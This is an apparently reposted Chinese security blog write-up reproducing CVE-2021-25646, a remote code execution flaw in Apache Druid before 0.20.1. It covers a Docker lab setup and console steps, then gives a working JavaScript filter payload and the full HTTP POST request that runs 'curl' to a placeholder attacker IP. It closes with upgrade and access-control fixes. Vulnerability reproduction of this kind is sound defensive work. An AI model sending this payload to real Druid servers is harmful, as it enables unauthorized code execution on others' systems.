> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ToGaV-wR28Cx9K-aBC7Lyg)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：****DesM0nd****@Timeline Sec  
**

**本文字数：997**

**阅读时长：2～3min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

Druid 不仅是一个数据库连接池，还包含一个 ProxyDriver、一系列内置的 JDBC 组件库、一个 SQL Parser。  

支持所有 JDBC 兼容的数据库，包括 Oracle、MySql、Derby、Postgresql、SQL Server、H2 等。

**0x02 漏洞概述**  

  

**编号：CVE-2021-25646**  
Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户可以构造传入的 json 串来控制一些敏感的参数发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。  

**0x03 影响版本**  

  

Apache Druid < 0.20.1  

**0x04 环境搭建**  

  

Apache Druid:0.16.0

```
参考现有的低版本druid
docker pull fokkodriesprong/docker-druid
docker run --rm -i -p 8888:8888 fokkodriesprong/docker-druid
```

**0x05 漏洞复现**  

  

访问 8888 端口, 进入 Druid console

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjalh3Xrz6WyOjDZnNQPRKV6QlSdLJ0uZBjQ9u3jz3FicCQ1ibLV0ibJJdMbK7oaIkkXicYnuLGZzSaSA/640?wx_fmt=png)

点击 Load data -> Local disk  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjalh3Xrz6WyOjDZnNQPRKVxTT9x5A1M6CrqWQuGV8NGiaZpuuTlzqUdGoQTbZpOtQlKq6GvILTiaaQ/640?wx_fmt=png)

填入

**Base directory:**  

quickstart/tutorial/  

**File filter:**  

wikiticker-2015-09-12-sampled.json.gz  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjalh3Xrz6WyOjDZnNQPRKVKLuy8ZPFSryhcfXW2JWulmiaSfC8UbiaJiao9b5FzXKIGAxibbRia9kY6DQ/640?wx_fmt=png)

一直点击 next 到 filter 项（设置步骤可参考：https://druid.apache.org/docs/latest/tutorials/index.html）  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjalh3Xrz6WyOjDZnNQPRKVDUjd6ZQwXpibJ5YaEPuJZ6k1CE1x6ap3e2GMzM12wakks1XUSm6Gvsw/640?wx_fmt=png)

抓包修改 filter 为  

```
{
    "type":"javascript",
    "function":"function(value){return java.lang.Runtime.getRuntime().exec('curl ip:8000')}",
    "dimension":"added",
    "":{
    "enabled":"true"
    }
}
```

对应 post 包为（执行的命令：curl ip:8000）  

```
POST /druid/indexer/v1/sampler?for=filter HTTP/1.1
Host: tls.com:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 623
Origin: http://tls.com:8888
Connection: close
Referer: http://tls.com:8888/unified-console.html


{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript",
"function":"function(value){return java.lang.Runtime.getRuntime().exec('curl yourip:8000')}",
"dimension":"added",
"":{
"enabled":"true"
}
}}}},"samplerConfig":{"numRows":500,"cacheKey":"79a5be988bf94d42a6f219b63ff27383"}}
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsjalh3Xrz6WyOjDZnNQPRKVV4EZicsxibMjmsCZibDtRCj3xbSjVsFYkhUac6rGs0n3aQqTicJAAz5Gew/640?wx_fmt=png)

**0x07 修复方式**  

  

升级 Apache Druid 到最新的版本

对 Apache Druid 进行权限控制，只允许受信任的主机访问集群服务器

```
参考链接：
```

https://github.com/Fokko/docker-druid

https://druid.apache.org/docs/latest/tutorials/index.html

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行